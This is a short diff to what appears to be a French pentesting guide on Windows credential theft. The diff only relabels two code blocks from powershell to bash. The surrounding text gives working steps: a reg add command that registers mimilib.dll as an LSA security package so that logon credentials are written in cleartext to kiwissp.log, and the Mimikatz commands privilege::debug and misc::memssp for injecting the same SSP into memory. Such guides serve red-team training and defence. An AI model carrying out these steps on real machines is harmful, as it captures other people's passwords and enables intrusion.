@@ -19,7 +19,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Ajoutez `mimilib.dll` à la liste des fournisseurs de support de sécurité (Security Packages) :
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 Et après un redémarrage, toutes les informations d'identification peuvent être trouvées en texte clair dans `C:\Windows\System32\kiwissp.log`
@@ -27,7 +27,7 @@ Et après un redémarrage, toutes les informations d'identification peuvent êtr
 #### En mémoire
 
 Vous pouvez également injecter cela en mémoire directement en utilisant Mimikatz (notez que cela pourrait être un peu instable/ne pas fonctionner) :
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
